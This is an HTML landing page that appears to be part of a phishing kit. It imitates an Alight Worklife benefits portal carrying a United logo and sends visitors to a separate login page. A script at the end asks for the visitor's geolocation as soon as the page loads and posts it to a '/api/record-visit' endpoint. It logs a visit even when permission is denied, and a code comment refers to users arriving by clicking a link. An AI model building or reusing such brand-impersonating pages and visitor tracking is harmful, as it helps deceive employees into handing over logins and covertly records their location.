<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Smart Choice Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background:transparent;
            color: white;
            height: 100%;
            overflow: hidden;
            margin: 0;
            padding: 0;
            
        }
        .header {
            padding: 40px 20px 20px;
            text-align: center;
            position: absolute;
            top: 0;
            width: 100%;
                z-index: 10;
                background: transparent;
                height: 80px;
                
        }
        .logo {
            font-size: 1.8rem;
            font-weight: 700;
       
        }
        .subtitle {
            font-size: 1.9rem;
            margin-top: 5px;
            font-weight: 600;
        }
        .sun {
            font-size: 3.5rem;
            margin: 15px 0;
        }

        /* Carousel */
        .carousel {
            position: relative;
            height: 55vh;
            overflow: hidden;
        }
        .slides {
            display: flex;
            transition: transform 0.5s ease;
            height: 100vh;
            position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                
            
            
            

        }
        .slide {
            min-width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: flex-end;
            padding: 40px 25px;
            position: relative;
          
    
            
        }
        .slide img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        
        }
        .slide::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.75));
        }
        .slide-content {
            position: relative;
            z-index: 2;
            max-width: 380px;
        }
        .slide h2 {
            font-size: 2rem;
            margin-bottom: 30px;
           
        }
        .slide p {
            font-size: 1.15rem;
            line-height: 1.4;
            margin-bottom: 250px;
            
        }

        /* Dots */
        .dots {
            text-align: center;
            margin: 20px 0;
            ;
        }
        .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #1ea05d;
            border-radius: 50%;
            margin: 0 5px;
            cursor: pointer;
        }
        .dot.active {
            background: white;
            transform: scale(1.3);
        }

        /* Buttons */
        .buttons {
            padding: 20px 25px;
            display: flex;
            gap: 15px;
            background: transparent;
            
        }
        .btn {
            flex: 1;
            padding: 16px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            position: relative;
            z-index: 2;
            margin-top: 20vh;
            
           
            
        }
        .btn-login {
            background: white;
            color: #1e40af;
            margin-top: 1vh;
            
        }
        .btn-signup {
            background: #166534;
            color: white;
             margin-top: 1vh;
        }
        .under{
            font-size: small;
        }

                .logo-container { 
            text-align: center; 
            margin: 40px 0 30px; 
            z-index: 2; 
            position: relative;
        }

        /* Alight Worklife Logo */
        .alight-worklife {
            font-size: 2.8rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            margin-bottom: 10px;
        }
        .alight-worklife .alight {
            color: #1a1a1a;
        }
        .alight-worklife .worklife {
            background: linear-gradient(90deg, #7ed957, #34d399);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }

        /* United Logo */
        .united-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin: 15px 0 20px;
        }
        .united-logo .united-text {
            font-size: 2.4rem;
            font-weight: 800;
            color: #0033a0;
            letter-spacing: 0.05em;
        }
        .globe {
            font-size: 2.6rem;
            line-height: 1;
        }
    </style>
</head>
<body>
  <div class="logo-container">
        <div class="alight-worklife">
            <span class="alight">alight</span>
            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
        </div>

        <div class="united-logo">
            <span class="united-text">UNITED</span>
            <span class="globe">🌐</span>
        </div>


    <!-- Carousel -->
    <div class="carousel">
        <div class="slides" id="slides">
            <!-- Slide 1 -->
            <div class="slide" style="background-image: url('login1.jpg');">
                <div class="slide-content">
                    <h2>Innovative</h2>
                    <p>Manage all aspects of health and wealth using our AI-powered app.</p>
                </div>
            </div>
            
            <!-- Slide 2 -->
            <div class="slide" style="background-image: url('login2.jpg');">
                <div class="slide-content">
                    <h2>Personal</h2>
                    <p>Get personalized recommendations about spending and savings to maximize your account’s value.</p>
                </div>
            </div>
            
            <!-- Slide 3 -->
            <div class="slide" style="background-image: url('login3.jpg');">
                <div class="slide-content">
                    <h2>Simple</h2>
                    <p>Account self-service made easy!</p>
                </div>
            </div>
        </div>
    </div>

    <div class="dots" id="dots"></div>

    <div class="button ns">
        <div class="btn btn-login" onclick="goToLogin()">Alight Worklife login 
            <p class="under">
        </div>
        <div class="btn btn-signup" onclick="goToSignup()">SIGN UP</div>
    </div>

    <script>
        let currentSlide = 0;
        const slides = document.getElementById('slides');
        const totalSlides = 3;

        // Create dots
        const dotsContainer = document.getElementById('dots');
        for (let i = 0; i < totalSlides; i++) {
            const dot = document.createElement('span');
            dot.classList.add('dot');
            if (i === 0) dot.classList.add('active');
            dot.onclick = () => goToSlide(i);
            dotsContainer.appendChild(dot);
        }

        function goToSlide(n) {
            currentSlide = n;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        }

        function updateDots() {
            const dots = dotsContainer.querySelectorAll('.dot');
            dots.forEach((dot, index) => {
                dot.classList.toggle('active', index === currentSlide);
            });
        }

        // Auto slide every 5 seconds
        setInterval(() => {
            currentSlide = (currentSlide + 1) % totalSlides;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        }, 5000);

        // Swipe Support
        let touchStartX = 0;
        slides.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
        slides.addEventListener('touchend', e => {
            const touchEndX = e.changedTouches[0].screenX;
            if (touchEndX < touchStartX - 50) {
                currentSlide = (currentSlide + 1) % totalSlides;
            } else if (touchEndX > touchStartX + 50) {
                currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
            }
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        });

        function goToLogin() {
            window.location.href = "login.html";
        }
        function goToSignup() {
            window.location.href = "index.html";
        }
        
   // Get real geolocation when user clicks the link
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const loc = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
            
            try {
                await fetch('/api/record-visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ location: loc })
                });
            } catch (e) {}
        }, () => {
            // If user denies permission
            fetch('/api/record-visit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ location: 'Permission Denied' })
            });
        });
    }
    </script>
    <script src="app.js"></script>
    
</body>
</html>
